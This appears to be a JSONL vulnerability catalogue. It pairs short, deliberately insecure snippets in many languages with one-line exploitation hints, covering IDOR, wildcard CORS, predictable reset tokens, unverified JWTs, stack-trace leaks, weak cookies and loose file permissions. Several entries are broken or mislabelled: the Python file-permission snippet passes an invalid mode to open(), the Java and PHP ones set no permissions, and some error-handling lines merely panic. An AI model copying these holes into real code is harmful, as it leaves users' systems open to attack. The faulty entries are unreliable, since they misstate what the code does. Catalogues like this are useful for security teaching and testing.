{"id": "vuln-627", "language": "Go", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "http.HandleFunc(\"/user\", func(w http.ResponseWriter, r *http.Request) { id := r.URL.Query().Get(\"id\"); db.Find(id) })", "exploitation_techniques": "Access records by guessing IDs.", "cwe_category": "Access & Authorization"}
{"id": "vuln-628", "language": "C# (.NET)", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "[HttpGet(\"user/{id}\")] public IActionResult GetUser(int id) { return Ok(db.Find(id)); }", "exploitation_techniques": "Access unauthorized data by ID manipulation.", "cwe_category": "Access & Authorization"}
{"id": "vuln-629", "language": "Kotlin", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "get(\"/user/{id}\") { call.respond(userRepo.findById(call.parameters[\"id\"]!!)) }", "exploitation_techniques": "Access records by guessing IDs.", "cwe_category": "Access & Authorization"}
{"id": "vuln-630", "language": "Scala", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "get(\"/user/:id\") { userRepo.find(params(\"id\").toLong) }", "exploitation_techniques": "Access unauthorized data via ID guessing.", "cwe_category": "Access & Authorization"}
{"id": "vuln-631", "language": "Rust", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "router.get(\"/user/:id\", |req, res| db.find(req.param(\"id\")?.parse()?))", "exploitation_techniques": "Access records by manipulating IDs.", "cwe_category": "Access & Authorization"}
{"id": "vuln-632", "language": "Elixir", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "get \"/user/:id\", UserController, :show", "exploitation_techniques": "Access unauthorized records via ID guessing.", "cwe_category": "Access & Authorization"}
{"id": "vuln-633", "language": "Perl", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "my $id = $r->param('id'); my $user = $db->select(\"SELECT * FROM users WHERE id = ?\", $id);", "exploitation_techniques": "Access records by guessing IDs.", "cwe_category": "Access & Authorization"}
{"id": "vuln-634", "language": "Node.js", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "app.use(cors({ origin: '*' }));", "exploitation_techniques": "Make unauthorized cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-635", "language": "Python", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "app.add_middleware(CORSMiddleware, allow_origins=['*'])", "exploitation_techniques": "Perform cross-origin attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-636", "language": "Java", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "@CrossOrigin(origins = \"*\") @GetMapping(\"/api\") public Data getData() { ... }", "exploitation_techniques": "Make unauthorized CORS requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-637", "language": "PHP", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "header('Access-Control-Allow-Origin: *');", "exploitation_techniques": "Perform cross-origin attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-638", "language": "Ruby", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "response.headers['Access-Control-Allow-Origin'] = '*'", "exploitation_techniques": "Make unauthorized CORS requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-639", "language": "Go", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "w.Header().Set(\"Access-Control-Allow-Origin\", \"*\")", "exploitation_techniques": "Perform cross-origin attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-640", "language": "C# (.NET)", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "services.AddCors(options => options.AddPolicy(\"AllowAll\", builder => builder.AllowAnyOrigin()));", "exploitation_techniques": "Make unauthorized CORS requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-641", "language": "Kotlin", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "install(CORS) { anyHost() }", "exploitation_techniques": "Perform cross-origin attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-642", "language": "Scala", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "response.withHeaders(\"Access-Control-Allow-Origin\" -> \"*\")", "exploitation_techniques": "Make unauthorized CORS requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-643", "language": "Rust", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "res.header(\"Access-Control-Allow-Origin\", \"*\")", "exploitation_techniques": "Perform cross-origin attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-644", "language": "Elixir", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "plug CORSPlug, origin: \"*\"", "exploitation_techniques": "Make unauthorized CORS requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-645", "language": "Perl", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "$r->headers_out->set('Access-Control-Allow-Origin' => '*');", "exploitation_techniques": "Perform cross-origin attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-646", "language": "Node.js", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "app.post('/login', (req, res) => { req.session.user = user; });", "exploitation_techniques": "Reuse stolen session IDs post-login.", "cwe_category": "Session & Token Management"}
{"id": "vuln-647", "language": "Python", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "@app.route('/login', methods=['POST']) def login(): session['user'] = user", "exploitation_techniques": "Hijack sessions using old IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-648", "language": "Java", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "HttpSession session = request.getSession(); session.setAttribute(\"user\", user);", "exploitation_techniques": "Reuse pre-login session IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-649", "language": "PHP", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "session_start(); $_SESSION['user'] = $user;", "exploitation_techniques": "Hijack sessions with old IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-650", "language": "Ruby", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "post '/login' do session[:user] = user end", "exploitation_techniques": "Reuse stolen session IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-651", "language": "Go", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "session.Values[\"user\"] = user; session.Save(r, w)", "exploitation_techniques": "Hijack sessions using old IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-652", "language": "C# (.NET)", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "HttpContext.Session.SetString(\"user\", user);", "exploitation_techniques": "Reuse pre-login session IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-653", "language": "Kotlin", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "call.sessions.set(UserSession(user))", "exploitation_techniques": "Hijack sessions with old IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-654", "language": "Scala", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "Ok.withSession(\"user\" -> user.id.toString)", "exploitation_techniques": "Reuse stolen session IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-655", "language": "Rust", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "req.session()?.set(\"user\", user)?;", "exploitation_techniques": "Hijack sessions using old IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-656", "language": "Elixir", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "put_session(conn, :user, user)", "exploitation_techniques": "Reuse stolen session IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-657", "language": "Perl", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "$r->session->{user} = $user;", "exploitation_techniques": "Hijack sessions with old IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-658", "language": "Node.js", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "app.use((req, res) => res.set('Content-Security-Policy', \"default-src *\"));", "exploitation_techniques": "Inject malicious scripts via permissive CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-659", "language": "Python", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "response.headers['Content-Security-Policy'] = \"default-src *\"", "exploitation_techniques": "Execute malicious scripts via loose CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-660", "language": "Java", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "response.setHeader(\"Content-Security-Policy\", \"default-src *\");", "exploitation_techniques": "Inject scripts via permissive CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-661", "language": "PHP", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "header('Content-Security-Policy: default-src *');", "exploitation_techniques": "Execute malicious scripts via CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-662", "language": "Ruby", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "response.headers['Content-Security-Policy'] = 'default-src *'", "exploitation_techniques": "Inject scripts via loose CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-663", "language": "Go", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "w.Header().Set(\"Content-Security-Policy\", \"default-src *\")", "exploitation_techniques": "Execute malicious scripts via CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-664", "language": "C# (.NET)", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "Response.Headers.Add(\"Content-Security-Policy\", \"default-src *\");", "exploitation_techniques": "Inject scripts via permissive CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-665", "language": "Kotlin", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "call.response.header(\"Content-Security-Policy\", \"default-src *\")", "exploitation_techniques": "Execute malicious scripts via CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-666", "language": "Scala", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "Ok.withHeaders(\"Content-Security-Policy\" -> \"default-src *\")", "exploitation_techniques": "Inject scripts via loose CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-667", "language": "Rust", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "res.header(\"Content-Security-Policy\", \"default-src *\")", "exploitation_techniques": "Execute malicious scripts via CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-668", "language": "Elixir", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "put_resp_header(conn, \"content-security-policy\", \"default-src *\")", "exploitation_techniques": "Inject scripts via permissive CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-669", "language": "Perl", "vulnerability_type": "Insecure Content Security Policy", "code_snippet": "$r->headers_out->set('Content-Security-Policy' => 'default-src *');", "exploitation_techniques": "Execute malicious scripts via CSP.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-670", "language": "Node.js", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "const token = user.id + '-' + Date.now();", "exploitation_techniques": "Guess tokens to reset passwords.", "cwe_category": "Session & Token Management"}
{"id": "vuln-671", "language": "Python", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "token = f'{user.id}-{int(time.time())}'", "exploitation_techniques": "Predict tokens based on user ID and time.", "cwe_category": "Session & Token Management"}
{"id": "vuln-672", "language": "Java", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "String token = user.getId() + \"-\" + System.currentTimeMillis();", "exploitation_techniques": "Guess tokens to hijack reset process.", "cwe_category": "Session & Token Management"}
{"id": "vuln-673", "language": "PHP", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "$token = $user['id'] . '-' . time();", "exploitation_techniques": "Predict tokens based on ID and timestamp.", "cwe_category": "Session & Token Management"}
{"id": "vuln-674", "language": "Ruby", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "token = \"#{user.id}-#{Time.now.to_i}\"", "exploitation_techniques": "Guess tokens to reset passwords.", "cwe_category": "Session & Token Management"}
{"id": "vuln-675", "language": "Go", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "token := fmt.Sprintf(\"%d-%d\", user.ID, time.Now().Unix())", "exploitation_techniques": "Predict tokens based on user ID and time.", "cwe_category": "Session & Token Management"}
{"id": "vuln-676", "language": "C# (.NET)", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "var token = $\"{user.Id}-{DateTime.Now.Ticks}\";", "exploitation_techniques": "Guess tokens to hijack reset process.", "cwe_category": "Session & Token Management"}
{"id": "vuln-677", "language": "Kotlin", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "val token = \"${user.id}-${System.currentTimeMillis()}\"", "exploitation_techniques": "Predict tokens based on ID and timestamp.", "cwe_category": "Session & Token Management"}
{"id": "vuln-678", "language": "Scala", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "val token = s\"${user.id}-${System.currentTimeMillis()}\"", "exploitation_techniques": "Guess tokens to reset passwords.", "cwe_category": "Session & Token Management"}
{"id": "vuln-679", "language": "Rust", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "let token = format!(\"{}-{}\", user.id, SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs());", "exploitation_techniques": "Predict tokens based on ID and time.", "cwe_category": "Session & Token Management"}
{"id": "vuln-680", "language": "Elixir", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "token = \"#{user.id}-#{:os.system_time(:second)}\"", "exploitation_techniques": "Guess tokens to hijack reset process.", "cwe_category": "Session & Token Management"}
{"id": "vuln-681", "language": "Perl", "vulnerability_type": "Insecure Password Reset Token", "code_snippet": "my $token = \"$user->{id}-\" . time();", "exploitation_techniques": "Predict tokens based on ID and timestamp.", "cwe_category": "Session & Token Management"}
{"id": "vuln-682", "language": "Node.js", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "app.all('/api/*', (req, res) => handleRequest(req));", "exploitation_techniques": "Use TRACE or PUT to bypass restrictions.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-683", "language": "Python", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "@app.route('/api/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'TRACE'])", "exploitation_techniques": "Exploit TRACE or PUT for attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-684", "language": "Java", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "@RequestMapping(\"/api\") public Response handleAll(HttpServletRequest request) { ... }", "exploitation_techniques": "Use TRACE or PUT to bypass controls.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-685", "language": "PHP", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "if (in_array($_SERVER['REQUEST_URI'], ['/api'])) { handleRequest(); }", "exploitation_techniques": "Exploit TRACE or PUT methods.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-686", "language": "Ruby", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "match '/api/*path', to: 'api#handle', via: :all", "exploitation_techniques": "Use TRACE or PUT to bypass restrictions.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-687", "language": "Go", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "http.HandleFunc(\"/api\", handleRequest)", "exploitation_techniques": "Exploit TRACE or PUT methods.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-688", "language": "C# (.NET)", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "[HttpAny(\"/api\")] public IActionResult Handle() { ... }", "exploitation_techniques": "Use TRACE or PUT to bypass controls.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-689", "language": "Kotlin", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "route(\"/api\") { handle { handleRequest(call) } }", "exploitation_techniques": "Exploit TRACE or PUT methods.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-690", "language": "Scala", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "pathPrefix(\"api\") { handleRequest }", "exploitation_techniques": "Use TRACE or PUT to bypass restrictions.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-691", "language": "Rust", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "router.any(\"/api\", handle_request)", "exploitation_techniques": "Exploit TRACE or PUT methods.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-692", "language": "Elixir", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "match :*, \"/api\", ApiController, :handle", "exploitation_techniques": "Use TRACE or PUT to bypass controls.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-693", "language": "Perl", "vulnerability_type": "Insecure HTTP Method Handling", "code_snippet": "if ($r->uri =~ /^/api/) { handle_request($r); }", "exploitation_techniques": "Exploit TRACE or PUT methods.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-694", "language": "Node.js", "vulnerability_type": "Insecure Error Handling", "code_snippet": "app.use((err, req, res, next) => res.status(500).send(err.stack));", "exploitation_techniques": "Extract sensitive info from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-695", "language": "Python", "vulnerability_type": "Insecure Error Handling", "code_snippet": "@app.errorhandler(Exception) def handle_error(e): return str(e), 500", "exploitation_techniques": "Gain insights from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-696", "language": "Java", "vulnerability_type": "Insecure Error Handling", "code_snippet": "@ExceptionHandler(Exception.class) public ResponseEntity<?> handle(Exception e) { return ResponseEntity.status(500).body(e.getStackTrace()); }", "exploitation_techniques": "Extract sensitive data from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-697", "language": "PHP", "vulnerability_type": "Insecure Error Handling", "code_snippet": "set_error_handler(function($errno, $errstr) { echo $errstr; });", "exploitation_techniques": "Gain insights from error details.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-698", "language": "Ruby", "vulnerability_type": "Insecure Error Handling", "code_snippet": "rescue_from Exception do |e| render text: e.backtrace.join(\"\\n\") end", "exploitation_techniques": "Extract sensitive info from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-699", "language": "Go", "vulnerability_type": "Insecure Error Handling", "code_snippet": "http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { panic(\"error\") })", "exploitation_techniques": "Gain insights from error messages.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-700", "language": "C# (.NET)", "vulnerability_type": "Insecure Error Handling", "code_snippet": "app.UseExceptionHandler(errorApp => errorApp.Run(async context => await context.Response.WriteAsync(context.Exception.StackTrace)));", "exploitation_techniques": "Extract sensitive data from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-701", "language": "Kotlin", "vulnerability_type": "Insecure Error Handling", "code_snippet": "exception<Exception> { call.respond(HttpStatusCode.InternalServerError, it.stackTraceToString()) }", "exploitation_techniques": "Extract sensitive information from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-702", "language": "Scala", "vulnerability_type": "Insecure Error Handling", "code_snippet": "onFailure { case e: Exception => InternalServerError(e.getStackTrace.mkString(\"\\n\")) }", "exploitation_techniques": "Gain insights from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-703", "language": "Rust", "vulnerability_type": "Insecure Error Handling", "code_snippet": "router.get(\"/\", |_, res| res.render_text(format!(\"{:?}\", panic!(\"error\"))))", "exploitation_techniques": "Extract sensitive data from error messages.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-704", "language": "Elixir", "vulnerability_type": "Insecure Error Handling", "code_snippet": "plug :error_handler; def error_handler(conn, %{reason: reason}) do send_resp(conn, 500, inspect(reason)) end", "exploitation_techniques": "Gain insights from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-705", "language": "Perl", "vulnerability_type": "Insecure Error Handling", "code_snippet": "eval { die \"error\"; }; $r->print($@) if $@;", "exploitation_techniques": "Extract sensitive info from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-706", "language": "Node.js", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "res.cookie('session', token);", "exploitation_techniques": "Steal cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-707", "language": "Python", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "response.set_cookie('session', token)", "exploitation_techniques": "Access cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-708", "language": "Java", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "Cookie cookie = new Cookie(\"session\", token); response.addCookie(cookie);", "exploitation_techniques": "Steal cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-709", "language": "PHP", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "setcookie('session', $token);", "exploitation_techniques": "Access cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-710", "language": "Ruby", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "cookies[:session] = token", "exploitation_techniques": "Steal cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-711", "language": "Go", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: token})", "exploitation_techniques": "Access cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-712", "language": "C# (.NET)", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "Response.Cookies.Append(\"session\", token);", "exploitation_techniques": "Steal cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-713", "language": "Kotlin", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "call.response.cookies.append(\"session\", token)", "exploitation_techniques": "Access cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-714", "language": "Scala", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "Ok.withCookies(Cookie(\"session\", token))", "exploitation_techniques": "Steal cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-715", "language": "Rust", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "res.cookie(Cookie::new(\"session\", token))", "exploitation_techniques": "Access cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-716", "language": "Elixir", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "put_resp_cookie(conn, \"session\", token)", "exploitation_techniques": "Steal cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-717", "language": "Perl", "vulnerability_type": "Insecure Cookie Configuration", "code_snippet": "$r->headers_out->set('Set-Cookie' => \"session=$token\");", "exploitation_techniques": "Access cookies via XSS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-718", "language": "Node.js", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "res.cookie('session', token, { httpOnly: true });", "exploitation_techniques": "Intercept cookies over HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-719", "language": "Python", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "response.set_cookie('session', token, httponly=True)", "exploitation_techniques": "Steal cookies over non-HTTPS connections.", "cwe_category": "Session & Token Management"}
{"id": "vuln-720", "language": "Java", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "Cookie cookie = new Cookie(\"session\", token); cookie.setHttpOnly(true); response.addCookie(cookie);", "exploitation_techniques": "Intercept cookies over HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-721", "language": "PHP", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "setcookie('session', $token, ['httponly' => true]);", "exploitation_techniques": "Steal cookies over HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-722", "language": "Ruby", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "cookies[:session] = { value: token, httponly: true }", "exploitation_techniques": "Intercept cookies over non-HTTPS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-723", "language": "Go", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: token, HttpOnly: true})", "exploitation_techniques": "Steal cookies over HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-724", "language": "C# (.NET)", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "Response.Cookies.Append(\"session\", token, new CookieOptions { HttpOnly = true });", "exploitation_techniques": "Intercept cookies over HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-725", "language": "Kotlin", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "call.response.cookies.append(\"session\", token, httpOnly = true)", "exploitation_techniques": "Steal cookies over non-HTTPS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-726", "language": "Scala", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "Ok.withCookies(Cookie(\"session\", token, httpOnly = true))", "exploitation_techniques": "Intercept cookies over HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-727", "language": "Rust", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "res.cookie(Cookie::new(\"session\", token).http_only(true))", "exploitation_techniques": "Steal cookies over HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-728", "language": "Elixir", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "put_resp_cookie(conn, \"session\", token, http_only: true)", "exploitation_techniques": "Intercept cookies over non-HTTPS.", "cwe_category": "Session & Token Management"}
{"id": "vuln-729", "language": "Perl", "vulnerability_type": "Insecure Cookie Scope", "code_snippet": "$r->headers_out->set('Set-Cookie' => \"session=$token; HttpOnly\");", "exploitation_techniques": "Steal cookies over HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-730", "language": "Node.js", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "const payload = jwt.decode(token);", "exploitation_techniques": "Forge JWTs without signature checks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-731", "language": "Python", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "payload = jwt.decode(token, options={'verify_signature': False})", "exploitation_techniques": "Craft malicious JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-732", "language": "Java", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "DecodedJWT jwt = JWT.decode(token);", "exploitation_techniques": "Forge JWTs to bypass auth.", "cwe_category": "Session & Token Management"}
{"id": "vuln-733", "language": "PHP", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "$payload = JWT::decode($token, null);", "exploitation_techniques": "Craft forged JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-734", "language": "Ruby", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "payload = JWT.decode(token, nil, false)", "exploitation_techniques": "Forge JWTs to bypass authentication.", "cwe_category": "Session & Token Management"}
{"id": "vuln-735", "language": "Go", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "token, _ := jwt.Parse(tokenString, nil)", "exploitation_techniques": "Craft malicious JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-736", "language": "C# (.NET)", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "var payload = JwtSecurityTokenHandler().ReadJwtToken(token);", "exploitation_techniques": "Forge JWTs to bypass auth.", "cwe_category": "Session & Token Management"}
{"id": "vuln-737", "language": "Kotlin", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "val payload = JWT.decode(token)", "exploitation_techniques": "Craft forged JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-738", "language": "Scala", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "val payload = JWT.decode(token)", "exploitation_techniques": "Forge JWTs to bypass authentication.", "cwe_category": "Session & Token Management"}
{"id": "vuln-739", "language": "Rust", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "let claims = jsonwebtoken::decode::<Claims>(token, &DecodingKey::from_secret(&[]), &Validation::new(Algorithm::HS256))", "exploitation_techniques": "Craft malicious JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-740", "language": "Elixir", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "{:ok, payload} = Joken.peek(token)", "exploitation_techniques": "Forge JWTs to bypass auth.", "cwe_category": "Session & Token Management"}
{"id": "vuln-741", "language": "Perl", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "my $payload = decode_jwt($token);", "exploitation_techniques": "Craft forged JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-742", "language": "Node.js", "vulnerability_type": "Insecure File Permissions", "code_snippet": "fs.writeFileSync('/app/config.json', JSON.stringify(config), { mode: 0o666 });", "exploitation_techniques": "Read sensitive data from files.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-743", "language": "Python", "vulnerability_type": "Insecure File Permissions", "code_snippet": "with open('config.json', 'w', mode=0o666) as f: json.dump(config, f)", "exploitation_techniques": "Access sensitive file contents.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-744", "language": "Java", "vulnerability_type": "Insecure File Permissions", "code_snippet": "Files.write(Paths.get(\"config.json\"), config.getBytes(), StandardOpenOption.CREATE);", "exploitation_techniques": "Read sensitive data from files.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-745", "language": "PHP", "vulnerability_type": "Insecure File Permissions", "code_snippet": "file_put_contents('config.json', json_encode($config), FILE_APPEND);", "exploitation_techniques": "Access sensitive file contents.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-746", "language": "Ruby", "vulnerability_type": "Insecure File Permissions", "code_snippet": "File.write('config.json', config.to_json, mode: 'w')", "exploitation_techniques": "Read sensitive data from files.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-747", "language": "Go", "vulnerability_type": "Insecure File Permissions", "code_snippet": "os.WriteFile(\"config.json\", []byte(config), 0666)", "exploitation_techniques": "Access sensitive file contents.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-748", "language": "C# (.NET)", "vulnerability_type": "Insecure File Permissions", "code_snippet": "File.WriteAllText(\"config.json\", JsonSerializer.Serialize(config));", "exploitation_techniques": "Read sensitive data from files.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-749", "language": "Kotlin", "vulnerability_type": "Insecure File Permissions", "code_snippet": "File(\"config.json\").writeText(config.toJson())", "exploitation_techniques": "Access sensitive file contents.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-750", "language": "Scala", "vulnerability_type": "Insecure File Permissions", "code_snippet": "Files.write(Paths.get(\"config.json\"), config.getBytes)", "exploitation_techniques": "Read sensitive data from files.", "cwe_category": "Configuration & Environment"}
